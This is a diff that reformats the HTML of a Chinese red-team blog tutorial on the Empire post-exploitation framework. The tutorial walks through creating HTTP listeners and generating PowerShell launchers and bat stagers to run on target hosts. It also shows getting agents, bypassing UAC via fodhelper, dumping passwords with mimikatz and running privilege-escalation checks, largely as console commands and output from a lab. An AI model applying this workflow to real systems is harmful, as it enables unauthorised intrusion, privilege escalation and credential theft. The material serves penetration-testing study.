@@ -1,145 +1,9 @@
-<!DOCTYPE html>
-<html lang=""><head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-
-    <title>Intranet Space - Empire « 倾旋的博客</title>
-    <meta name="description" content="倾旋的博客">
-    <meta name="author" content='倾旋'>
-
-    <link rel="stylesheet" href="/css/Font-Awesome-5.15.3.all.min.css">
-
-    
-    <link rel="stylesheet" href="/sass/researcher.min.css">
-    
-    
-        <link rel="icon" type="image/ico" href="https://payloads.online/favicon.ico">
-    
-
-    
-        
-    
-</head>
-
-    <body>
-<input type="checkbox" id="menu-toggle" class="menu-toggle">
-<label tabindex="0" for="menu-toggle" class="burger"><span></span> <span></span> <span></span><div class="burger-text">Menu</div></label>
-<nav class="main-nav">
-    
-    <ul>
-    
-        
-        
-            <li><a href="/projects/">Projects</a></li>
-        
-            <li><a href="/links/">Links</a></li>
-        
-            <li><a href="/post/">Posts</a></li>
-        
-            <li><a href="/index.xml">Rss</a></li>
-        
-            <li><a href="/tools/">Tools</a></li>
-        
-    
-    </ul>
-   
-</nav>
-<nav><a href="/" class="all-posts-link">‹ All Posts</a></nav><div id="content">
-<div class="container">
-    <h1>Intranet Space - Empire</h1>
-    <p>Empire is a PowerShell and Python post-exploitation agent.</p>
-        <div class = "toc-wrapper">
-            
-<div class="post-toc" id="post-toc">
-<aside>
-    
-    
-    
-    <nav id="TableOfContents">
-  <ul>
-    <li><a href="#0x00-简介">0x00 简介</a></li>
-    <li><a href="#0x01-安装">0x01 安装</a></li>
-    <li><a href="#0x02-模块介绍">0x02 模块介绍</a>
-      <ul>
-        <li><a href="#empire-module-list">Empire Module List</a></li>
-        <li><a href="#listeners">listeners</a></li>
-        <li><a href="#agents">agents</a></li>
-        <li><a href="#stager">stager</a></li>
-        <li><a href="#module">module</a></li>
-        <li><a href="#plugins">plugins</a></li>
-        <li><a href="#creds">creds</a></li>
-      </ul>
-    </li>
-    <li><a href="#0x03-simply-use-empire">0x03 Simply use Empire</a>
-      <ul>
-        <li><a href="#如何获得agents">如何获得agents</a></li>
-      </ul>
-    </li>
-    <li><a href="#0x04-使用模块">0x04 使用模块</a>
-      <ul>
-        <li><a href="#bypass-uac">Bypass UAC</a></li>
-        <li><a href="#抓取密码">抓取密码</a></li>
-        <li><a href="#提权">提权</a></li>
-      </ul>
-    </li>
-    <li><a href="#0x05-生成stager">0x05 生成stager</a></li>
-  </ul>
-</nav>
-    
-    
-</aside>
-<a href="#" id="toc-toggle"></a>
-</div>
-
-
-
-        </div>
-    <h2 id="0x00-简介">0x00 简介</h2>
-<p><p class="md__image">
-    
-    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/3cc545d0-4f5f-11ec-9fe2-00d861bf4abb.jpg" alt="Empire"  />
-  </p></p>
-<p>Empire is a PowerShell and Python post-exploitation agent.</p>
-<p><a href="http://www.powershellempire.com/">http://www.powershellempire.com/</a></p>
-<h2 id="0x01-安装">0x01 安装</h2>
-<pre tabindex="0"><code>git clone https://github.com/EmpireProject/Empire
+<!doctype html><html lang><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><title>Intranet Space - Empire « 倾旋的博客</title><meta name=description content="倾旋的博客"><meta name=author content="倾旋"><link rel=stylesheet href=/css/Font-Awesome-5.15.3.all.min.css><link rel=stylesheet href=/sass/researcher.min.css><link rel=icon type=image/ico href=https://payloads.online/favicon.ico></head><body><input type=checkbox id=menu-toggle class=menu-toggle>
+<label tabindex=0 for=menu-toggle class=burger><span></span> <span></span> <span></span><div class=burger-text>Menu</div></label><nav class=main-nav><ul><li><a href=/projects/>Projects</a></li><li><a href=/links/>Links</a></li><li><a href=/post/>Posts</a></li><li><a href=/index.xml>Rss</a></li><li><a href=/tools/>Tools</a></li></ul></nav><nav><a href=/ class=all-posts-link>‹ All Posts</a></nav><div id=content><div class=container><h1>Intranet Space - Empire</h1><p>Empire is a PowerShell and Python post-exploitation agent.</p><div class=toc-wrapper><div class=post-toc id=post-toc><aside><nav id=TableOfContents><ul><li><a href=#0x00-简介>0x00 简介</a></li><li><a href=#0x01-安装>0x01 安装</a></li><li><a href=#0x02-模块介绍>0x02 模块介绍</a><ul><li><a href=#empire-module-list>Empire Module List</a></li><li><a href=#listeners>listeners</a></li><li><a href=#agents>agents</a></li><li><a href=#stager>stager</a></li><li><a href=#module>module</a></li><li><a href=#plugins>plugins</a></li><li><a href=#creds>creds</a></li></ul></li><li><a href=#0x03-simply-use-empire>0x03 Simply use Empire</a><ul><li><a href=#如何获得agents>如何获得agents</a></li></ul></li><li><a href=#0x04-使用模块>0x04 使用模块</a><ul><li><a href=#bypass-uac>Bypass UAC</a></li><li><a href=#抓取密码>抓取密码</a></li><li><a href=#提权>提权</a></li></ul></li><li><a href=#0x05-生成stager>0x05 生成stager</a></li></ul></nav></aside><a href=# id=toc-toggle></a></div></div><h2 id=0x00-简介>0x00 简介</h2><p><p class=md__image><img src=https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/3cc545d0-4f5f-11ec-9fe2-00d861bf4abb.jpg alt=Empire></p></p><p>Empire is a PowerShell and Python post-exploitation agent.</p><p><a href=http://www.powershellempire.com/>http://www.powershellempire.com/</a></p><h2 id=0x01-安装>0x01 安装</h2><pre tabindex=0><code>git clone https://github.com/EmpireProject/Empire
 cd Empire/setup.sh
 ./install.sh
-</code></pre><h2 id="0x02-模块介绍">0x02 模块介绍</h2>
-<p><p class="md__image">
-    
-    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/3d21b284-4f5f-11ec-88ff-00d861bf4abb.jpg" alt="72c95569361e869b11697561d9a7fcbb.png"  />
-  </p></p>
-<h3 id="empire-module-list">Empire Module List</h3>
-<ul>
-<li>agents</li>
-<li>creds</li>
-<li>plugins</li>
-<li>stager</li>
-<li>listeners</li>
-<li>module</li>
-</ul>
-<h3 id="listeners">listeners</h3>
-<p><code>listeners</code>的功能是监听一个端口，通过该端口给客户端传递更多的命令和载荷。</p>
-<h3 id="agents">agents</h3>
-<p><code>agents</code>主要是通过<code>listeners</code>获得的主机对象，可以通过<code>list</code>查看。</p>
-<h3 id="stager">stager</h3>
-<p><code>stager</code>主要是用于生成初级载荷，也就是木马，在客户端执行后，客户端会主动连接<code>listeners</code>监听的端口，同时服务端的<code>agents</code>列表会出现客户端的主机信息。</p>
-<h3 id="module">module</h3>
-<p><code>module</code>的主要功能是通过给<code>agents</code>提供更多的功能，可通过<code>searchmodule</code>搜索。</p>
-<h3 id="plugins">plugins</h3>
-<p><code>plugins</code>主要用于调用和管理Empire的扩展。</p>
-<h3 id="creds">creds</h3>
-<p><code>creds</code>是一个存储一些<code>agents</code>上获取到的凭证。</p>
-<h2 id="0x03-simply-use-empire">0x03 Simply use Empire</h2>
-<h3 id="如何获得agents">如何获得agents</h3>
-<pre tabindex="0"><code>./empire # 启动empire
-</code></pre><p><p class="md__image">
-    
-    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/3d7188f4-4f5f-11ec-85d8-00d861bf4abb.jpg" alt="2eca886e0349b46868d2f676b44a9703.png"  />
-  </p></p>
-<p>有285个module可以使用，1个listener在使用，0个agents。</p>
-<pre tabindex="0"><code>(Empire) &gt; listeners
+</code></pre><h2 id=0x02-模块介绍>0x02 模块介绍</h2><p><p class=md__image><img src=https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/3d21b284-4f5f-11ec-88ff-00d861bf4abb.jpg alt=72c95569361e869b11697561d9a7fcbb.png></p></p><h3 id=empire-module-list>Empire Module List</h3><ul><li>agents</li><li>creds</li><li>plugins</li><li>stager</li><li>listeners</li><li>module</li></ul><h3 id=listeners>listeners</h3><p><code>listeners</code>的功能是监听一个端口，通过该端口给客户端传递更多的命令和载荷。</p><h3 id=agents>agents</h3><p><code>agents</code>主要是通过<code>listeners</code>获得的主机对象，可以通过<code>list</code>查看。</p><h3 id=stager>stager</h3><p><code>stager</code>主要是用于生成初级载荷，也就是木马，在客户端执行后，客户端会主动连接<code>listeners</code>监听的端口，同时服务端的<code>agents</code>列表会出现客户端的主机信息。</p><h3 id=module>module</h3><p><code>module</code>的主要功能是通过给<code>agents</code>提供更多的功能，可通过<code>searchmodule</code>搜索。</p><h3 id=plugins>plugins</h3><p><code>plugins</code>主要用于调用和管理Empire的扩展。</p><h3 id=creds>creds</h3><p><code>creds</code>是一个存储一些<code>agents</code>上获取到的凭证。</p><h2 id=0x03-simply-use-empire>0x03 Simply use Empire</h2><h3 id=如何获得agents>如何获得agents</h3><pre tabindex=0><code>./empire # 启动empire
+</code></pre><p><p class=md__image><img src=https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/3d7188f4-4f5f-11ec-85d8-00d861bf4abb.jpg alt=2eca886e0349b46868d2f676b44a9703.png></p></p><p>有285个module可以使用，1个listener在使用，0个agents。</p><pre tabindex=0><code>(Empire) &gt; listeners
 
 [*] Active listeners:
 
@@ -150,8 +14,7 @@ cd Empire/setup.sh
 (Empire: listeners) &gt; uselistener 
 dbx           http_com      http_hop      meterpreter   redirector    
 http          http_foreign  http_mapi     onedrive     
-</code></pre><p>创建一个<code>listeners</code>：</p>
-<pre tabindex="0"><code>(Empire: listeners) &gt; uselistener http
+</code></pre><p>创建一个<code>listeners</code>：</p><pre tabindex=0><code>(Empire: listeners) &gt; uselistener http
 (Empire: listeners/http) &gt; info
 
     Name: HTTP[S]
@@ -191,8 +54,7 @@ HTTP[S] Options:
   Port              True        8089                             Port for the listener.
   ServerVersion     True        Microsoft-IIS/7.5                Server header for the control server.
   StagerURI         False                                        URI for the stager. Must use /download/. Example: /download/stager.php
-</code></pre><p>一般情况只需要指定Host、Port、Name即可，其他的选项可以根据场景设置。</p>
-<pre tabindex="0"><code>(Empire: listeners/http) &gt; set Name newListener
+</code></pre><p>一般情况只需要指定Host、Port、Name即可，其他的选项可以根据场景设置。</p><pre tabindex=0><code>(Empire: listeners/http) &gt; set Name newListener
 (Empire: listeners/http) &gt; set Port 7788
 (Empire: listeners/http) &gt; execute
 [*] Starting listener &#39;newListener&#39;
@@ -202,8 +64,7 @@ HTTP[S] Options:
    Use a production WSGI server instead.
  * Debug mode: off
 [+] Listener successfully started!
-</code></pre><p>查看<code>listeners</code>：</p>
-<pre tabindex="0"><code>(Empire: listeners/http) &gt; listeners
+</code></pre><p>查看<code>listeners</code>：</p><pre tabindex=0><code>(Empire: listeners/http) &gt; listeners
 
 [*] Active listeners:
 
@@ -211,15 +72,8 @@ HTTP[S] Options:
   ----              ------          ----                                 ------------   --------
   Hello             http            http://192.168.117.181:80            5/0.0                      
   newListener       http            http://192.168.117.181:7788            5/0.0                      
-</code></pre><p>生成控制命令：</p>
-<pre tabindex="0"><code>launcher powershell newListener
-</code></pre><p>在目标主机上执行这条指令后，可以获得一个<code>agent</code>。</p>
-<p><strong>listeners中的Port必须和Host的端口相同</strong></p>
-<p><p class="md__image">
-    
-    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/3db6ef8e-4f5f-11ec-aa5d-00d861bf4abb.jpg" alt="5ce76e0d2cc5751a5185b435fa24dc00.png"  />
-  </p></p>
-<pre tabindex="0"><code>(Empire: listeners) &gt; agents
+</code></pre><p>生成控制命令：</p><pre tabindex=0><code>launcher powershell newListener
+</code></pre><p>在目标主机上执行这条指令后，可以获得一个<code>agent</code>。</p><p><strong>listeners中的Port必须和Host的端口相同</strong></p><p><p class=md__image><img src=https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/3db6ef8e-4f5f-11ec-aa5d-00d861bf4abb.jpg alt=5ce76e0d2cc5751a5185b435fa24dc00.png></p></p><pre tabindex=0><code>(Empire: listeners) &gt; agents
 
 [*] Active agents:
 
@@ -228,24 +82,10 @@ HTTP[S] Options:
  MYZBFLEX ps 192.168.117.179 DESKTOP-7KT7GL1   DESKTOP-7KT7GL1\Rvn0xsy powershell         7256   5/0.0    2018-12-18 02:14:47
 
 (Empire: agents) &gt; 
-</code></pre><h2 id="0x04-使用模块">0x04 使用模块</h2>
-<h3 id="bypass-uac">Bypass UAC</h3>
-<p>常用的有以下模块：</p>
-<ul>
-<li>powershell/privesc/bypassuac</li>
-<li>powershell/privesc/bypassuac_env</li>
-<li>powershell/privesc/bypassuac_eventvwr</li>
-<li>powershell/privesc/bypassuac_fodhelper</li>
-<li>powershell/privesc/bypassuac_sdctlbypass</li>
-<li>powershell/privesc/bypassuac_tokenmanipulation</li>
-<li>powershell/privesc/bypassuac_wscript</li>
-</ul>
-<p>也可以直接这么使用：</p>
-<pre tabindex="0"><code>(Empire: agents) &gt; interact MYZBFLEX
+</code></pre><h2 id=0x04-使用模块>0x04 使用模块</h2><h3 id=bypass-uac>Bypass UAC</h3><p>常用的有以下模块：</p><ul><li>powershell/privesc/bypassuac</li><li>powershell/privesc/bypassuac_env</li><li>powershell/privesc/bypassuac_eventvwr</li><li>powershell/privesc/bypassuac_fodhelper</li><li>powershell/privesc/bypassuac_sdctlbypass</li><li>powershell/privesc/bypassuac_tokenmanipulation</li><li>powershell/privesc/bypassuac_wscript</li></ul><p>也可以直接这么使用：</p><pre tabindex=0><code>(Empire: agents) &gt; interact MYZBFLEX
 (Empire: MYZBFLEX) &gt; bypassuac
 </code></pre><p>但是默认的bypassuac是使用的<code>bypassuac_eventvwr</code>，这时候就需要调用其他的了
-。</p>
-<pre tabindex="0"><code>(Empire: MYZBFLEX) &gt; usemodule privesc/bypassuac_fodhelper 
+。</p><pre tabindex=0><code>(Empire: MYZBFLEX) &gt; usemodule privesc/bypassuac_fodhelper 
 (Empire: powershell/privesc/bypassuac_fodhelper) &gt; info
 
               Name: Invoke-FodHelperBypass
@@ -296,12 +136,7 @@ Job started: 9HABCE
 [*] New agent VZWXYL4T checked in
 [+] Initial agent VZWXYL4T from 192.168.117.179 now active (Slack)
 [*] Sending agent (stage 2) to VZWXYL4T at 192.168.117.179
-</code></pre><p><p class="md__image">
-    
-    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/3dfd0a00-4f5f-11ec-84ec-00d861bf4abb.jpg" alt="20fb5ad72cd8b7ba728b8d0be7d08c87.png"  />
-  </p></p>
-<p>此时<code>agents</code>列表如下：</p>
-<pre tabindex="0"><code>(Empire: powershell/privesc/bypassuac_fodhelper) &gt; agents
+</code></pre><p><p class=md__image><img src=https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/3dfd0a00-4f5f-11ec-84ec-00d861bf4abb.jpg alt=20fb5ad72cd8b7ba728b8d0be7d08c87.png></p></p><p>此时<code>agents</code>列表如下：</p><pre tabindex=0><code>(Empire: powershell/privesc/bypassuac_fodhelper) &gt; agents
 
 [*] Active agents:
 
@@ -311,8 +146,7 @@ Job started: 9HABCE
  VZWXYL4T ps 192.168.117.179 DESKTOP-7KT7GL1   *DESKTOP-7KT7GL1\Rvn0xs powershell         9392   5/0.0    2018-12-18 02:22:26
 
 (Empire: agents) &gt; 
-</code></pre><p>计算机名前带有<code>*</code>的<code>agents</code>才可以使用<code>*</code>结尾的模块：</p>
-<pre tabindex="0"><code>Display all 204 possibilities? (y or n)
+</code></pre><p>计算机名前带有<code>*</code>的<code>agents</code>才可以使用<code>*</code>结尾的模块：</p><pre tabindex=0><code>Display all 204 possibilities? (y or n)
 code_execution/invoke_dllinjection
 code_execution/invoke_metasploitpayload
 code_execution/invoke_ntsd
@@ -517,18 +351,14 @@ trollsploit/thunderstruck
 trollsploit/voicetroll
 trollsploit/wallpaper
 trollsploit/wlmdr
-</code></pre><h3 id="抓取密码">抓取密码</h3>
-<p>可在agents中直接调用mimikatz：</p>
-<pre tabindex="0"><code>(Empire: VZWXYL4T) &gt; mimikatz
+</code></pre><h3 id=抓取密码>抓取密码</h3><p>可在agents中直接调用mimikatz：</p><pre tabindex=0><code>(Empire: VZWXYL4T) &gt; mimikatz
 [*] Tasked VZWXYL4T to run TASK_CMD_JOB
 [*] Agent VZWXYL4T tasked with task ID 1
 [*] Tasked agent VZWXYL4T to run module powershell/credentials/mimikatz/logonpasswords
 (Empire: VZWXYL4T) &gt; [*] Agent VZWXYL4T returned results.
 Job started: EV7DPF
 [*] Valid results returned by 192.168.117.179
-</code></pre><p>默认是：powershell/credentials/mimikatz/logonpasswords</p>
-<p>也可以使用usemodule指定以下模块：</p>
-<pre tabindex="0"><code>credentials/credential_injection*
+</code></pre><p>默认是：powershell/credentials/mimikatz/logonpasswords</p><p>也可以使用usemodule指定以下模块：</p><pre tabindex=0><code>credentials/credential_injection*
 credentials/enum_cred_store
 credentials/invoke_kerberoast
 credentials/mimikatz/cache*
@@ -551,11 +381,9 @@ credentials/powerdump*
 credentials/sessiongopher
 credentials/tokens
 credentials/vault_credential*
-</code></pre><h3 id="提权">提权</h3>
-<pre tabindex="0"><code>usemodule privesc/powerup/allchecks
+</code></pre><h3 id=提权>提权</h3><pre tabindex=0><code>usemodule privesc/powerup/allchecks
 execute
-</code></pre><h2 id="0x05-生成stager">0x05 生成stager</h2>
-<pre tabindex="0"><code>(Empire) &gt; usestager 
+</code></pre><h2 id=0x05-生成stager>0x05 生成stager</h2><pre tabindex=0><code>(Empire) &gt; usestager 
 multi/bash                osx/macho                 windows/launcher_bat
 multi/launcher            osx/macro                 windows/launcher_lnk
 multi/macro               osx/pkg                   windows/launcher_sct
@@ -567,128 +395,9 @@ osx/ducky                 windows/csharp_exe        windows/shellcode
 osx/dylib                 windows/dll               windows/teensy
 osx/jar                   windows/ducky             
 osx/launcher              windows/hta             
-</code></pre><p>生成一个bat的：</p>
-<pre tabindex="0"><code>usestager windows/launcher_bat
+</code></pre><p>生成一个bat的：</p><pre tabindex=0><code>usestager windows/launcher_bat
 set Listener hello
 execute
-</code></pre><p><p class="md__image">
-    
-    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/3e43a87a-4f5f-11ec-a19a-00d861bf4abb.jpg" alt="f5ddc9cdb32f7eebda8571e0dbb7dbc9.png"  />
-  </p></p>
-<p>将bat文件在目标主机上运行即可。</p>
-<p>一般情况下，生成的都是powershell指令，只是引入方式有许多种。</p>
-
-</div>
-<div class="container">
-    <script src="https://giscus.app/client.js"
-    data-repo="Rvn0xsy/rvn0xsy.github.io"
-    data-repo-id="MDEwOlJlcG9zaXRvcnk0MDEyMzI3MTY="
-    data-category="General"
-    data-category-id="DIC_kwDOF-pTTM4CRDk_"
-    data-mapping="title"
-    data-strict="0"
-    data-reactions-enabled="1"
-    data-emit-metadata="0"
-    data-input-position="bottom"
-    data-theme="dark_tritanopia"
-    data-lang="zh-CN"
-    data-loading="lazy"
-    crossorigin="anonymous"
-    async>
-  </script>
-</div>
-<div class="container">
-    <section class="bio" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-    <div class="bio__blurb">
-        <h2 class="site-h2">网络安全爱好者、安全工具开发者</h2>
-        <p>现阶段在进行红队相关的工作，我的博客会记录一些我的学习过程和部分安全技术研究成果。</p>
-    </div>
-<div class="bio__avatar">
-    <img src="/avatar.jpeg" alt="Duncan McDougall and heir apparent">
-</div></section>
-</div>
-
-        </div>
-<footer class="site-footer">
-    <div class="container">
-        <div class="site-footer__col">
-        <h5>Get in touch</h5>
-        <p>
-            If you like my project or have some questions,feel free
-            to contact me</a>.
-        </p>
-        </div>
-        <div class="site-footer__col site-footer__col--links">
-        <h5>Me Elsewhere</h5>
-        <ul>
-        
-                <li>
-                    <a href="https://twitter.com/Rvn0xsy"><i class="fab fa-twitter"></i> Twitter</a>
-                    
-                </li>
-        
-                <li>
-                    <a href="mailto:rvn0xsy@gmail.com"><i class="fas fa-envelope"></i> E-mail</a>
-                    
-                </li>
-        
-                <li>
-                    <a href="https://github.com/Rvn0xsy"><i class="fab fa-github"></i> Github</a>
-                    
-                </li>
-        
-        </ul>
-        </div>
-        <div class="site-footer__col site-footer__col--links">
-        <h5>Meta Links</h5>
-        <ul>
-            
-                
-                
-                    <li class="">
-                        <a href="/projects/"><i class="fas fa-code"></i> Projects</a>
-                    </li>
-                
-                    <li class="">
-                        <a href="/links/"><i class="fas fa-link"></i> Links</a>
-                    </li>
-                
-                    <li class="">
-                        <a href="/post/"><i class="fa fa-file-alt"></i> Posts</a>
-                    </li>
-                
-                    <li class="">
-                        <a href="/index.xml"><i class="fa fa-rss-square"></i> Rss</a>
-                    </li>
-                
-                    <li class="">
-                        <a href="/tools/"><i class="fas fa-tools"></i> Tools</a>
-                    </li>
-                
-            
-        </ul>
-        </div>
-        <p class="site-footer__copyright">
-        © 倾旋 2021. All rights reserved.
-        </p>
-    </div>
-    </footer>
-
-
-
-<script src="https://cdn.jsdelivr.net/gh/jmnote/plantuml-encoder@1.2.4/dist/plantuml-encoder.min.js" integrity="sha256-Qsk2KRBCN5qVZX7B+8+2IvQl1Aqc723qV1tBCQaVoqo=" crossorigin="anonymous"></script>
-<script>
-(function(){
-  let plantumlPrefix = "language-plantuml";
-  Array.prototype.forEach.call(document.querySelectorAll("[class^=" + plantumlPrefix + "]"), function(code){
-    let image = document.createElement("IMG");
-    image.loading = 'lazy'; 
-    image.src = 'http://www.plantuml.com/plantuml/svg/~1' + plantumlEncoder.encode(code.innerText);
-    code.parentNode.insertBefore(image, code);
-    code.style.display = 'none';
-  });
-})();
-</script>
-
-</body>
-</html>
+</code></pre><p><p class=md__image><img src=https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/3e43a87a-4f5f-11ec-a19a-00d861bf4abb.jpg alt=f5ddc9cdb32f7eebda8571e0dbb7dbc9.png></p></p><p>将bat文件在目标主机上运行即可。</p><p>一般情况下，生成的都是powershell指令，只是引入方式有许多种。</p></div><div class=container><script src=https://giscus.app/client.js data-repo=Rvn0xsy/rvn0xsy.github.io data-repo-id="MDEwOlJlcG9zaXRvcnk0MDEyMzI3MTY=" data-category=General data-category-id=DIC_kwDOF-pTTM4CRDk_ data-mapping=title data-strict=0 data-reactions-enabled=1 data-emit-metadata=0 data-input-position=bottom data-theme=dark_tritanopia data-lang=zh-CN data-loading=lazy crossorigin=anonymous async></script></div><div class=container><section class=bio itemprop=author itemscope itemtype=http://schema.org/Person><div class=bio__blurb><h2 class=site-h2>网络安全爱好者、安全工具开发者</h2><p>现阶段在进行红队相关的工作，我的博客会记录一些我的学习过程和部分安全技术研究成果。</p></div><div class=bio__avatar><img src=/avatar.jpeg alt="Duncan McDougall and heir apparent"></div></section></div></div><footer class=site-footer><div class=container><div class=site-footer__col><h5>Get in touch</h5><p>If you like my project or have some questions,feel free
+to contact me</a>.</p></div><div class="site-footer__col site-footer__col--links"><h5>Me Elsewhere</h5><ul><li><a href=https://twitter.com/Rvn0xsy><i class="fab fa-twitter"></i> Twitter</a></li><li><a href=mailto:rvn0xsy@gmail.com><i class="fas fa-envelope"></i> E-mail</a></li><li><a href=https://github.com/Rvn0xsy><i class="fab fa-github"></i> Github</a></li></ul></div><div class="site-footer__col site-footer__col--links"><h5>Meta Links</h5><ul><li><a href=/projects/><i class="fas fa-code"></i> Projects</a></li><li><a href=/links/><i class="fas fa-link"></i> Links</a></li><li><a href=/post/><i class="fa fa-file-alt"></i> Posts</a></li><li><a href=/index.xml><i class="fa fa-rss-square"></i> Rss</a></li><li><a href=/tools/><i class="fas fa-tools"></i> Tools</a></li></ul></div><p class=site-footer__copyright>© 倾旋 2021. All rights reserved.</p></div></footer><script src=https://cdn.jsdelivr.net/gh/jmnote/plantuml-encoder@1.2.4/dist/plantuml-encoder.min.js integrity="sha256-Qsk2KRBCN5qVZX7B+8+2IvQl1Aqc723qV1tBCQaVoqo=" crossorigin=anonymous></script>
+<script>(function(){let e="language-plantuml";Array.prototype.forEach.call(document.querySelectorAll("[class^="+e+"]"),function(e){let t=document.createElement("IMG");t.loading="lazy",t.src="http://www.plantuml.com/plantuml/svg/~1"+plantumlEncoder.encode(e.innerText),e.parentNode.insertBefore(t,e),e.style.display="none"})})()</script></body></html>
